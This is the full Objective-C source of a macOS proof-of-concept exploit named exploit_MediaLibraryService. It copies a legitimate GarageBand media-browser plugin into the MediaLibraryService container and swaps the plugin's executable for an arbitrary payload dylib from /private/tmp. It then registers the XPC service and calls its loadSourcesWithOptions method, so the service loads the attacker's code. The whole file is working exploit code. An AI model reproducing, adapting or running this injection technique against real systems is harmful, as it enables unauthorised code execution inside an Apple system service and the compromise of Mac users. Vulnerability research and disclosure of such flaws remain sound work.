//
//  main.m
//  exploit_MediaLibraryService
//
//  Created by mickey on 2023/3/9.
//

#import <Foundation/Foundation.h>

@protocol MLSMediaLibraryProtocol
- (void)loadSourcesWithOptions:(NSDictionary *)arg1 completionHandler:(void (^)(NSDictionary *, NSError *))arg2;
@end

void prepare_my_plugin(void) {
    NSString *pluginDir = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Containers/com.apple.MediaLibraryService/Data/Library/Application Support/iLifeMediaBrowser/Plug-Ins"];
    NSString *pluginPath = [pluginDir stringByAppendingPathComponent:@"iLMBGarageBandPlugin.ilmbplugin"];
    NSString *pluginExe = [pluginPath stringByAppendingPathComponent:@"Contents/MacOS/iLMBGarageBandPlugin"];
    NSLog(@"preparing my plugin:%@", pluginExe);
    
    NSFileManager *fm = [NSFileManager defaultManager];
    [fm createDirectoryAtPath:pluginDir withIntermediateDirectories:YES attributes:0 error:0];
    [fm copyItemAtPath:@"/Library/Application Support/iLifeMediaBrowser/Plug-Ins/iLMBGarageBandPlugin.ilmbplugin" toPath:pluginPath error:0];
    [fm removeItemAtPath:pluginExe error:0];
    [fm copyItemAtPath:@"/private/tmp/payload.dylib" toPath:pluginExe error:0];
}

void load_my_plugin(void) {
    void xpc_add_bundle(char *, int);
    xpc_add_bundle("/private/tmp/com.apple.MediaLibraryService.xpc", 2);
    NSXPCConnection *connection = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.MediaLibraryService"];
    connection.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MLSMediaLibraryProtocol)];
    [connection setInterruptionHandler:^{
        NSLog(@"connection interrupted!");
    }];
    [connection setInvalidationHandler:^{
        NSLog(@"connection invalidated!");
    }];
    [connection resume];
    
    id proxy = connection.remoteObjectProxy;
    NSLog(@"Loading my plugin...");
    [proxy loadSourcesWithOptions:nil completionHandler:^(NSDictionary *dict, NSError *error) {
        NSLog(@"result:%@, error:%@", dict, error);
        NSLog(@"done, press enter to exit");
    }];
    getchar();
}


int main(int argc, const char * argv[]) {
    prepare_my_plugin();
    load_my_plugin();
    
    return 0;
}
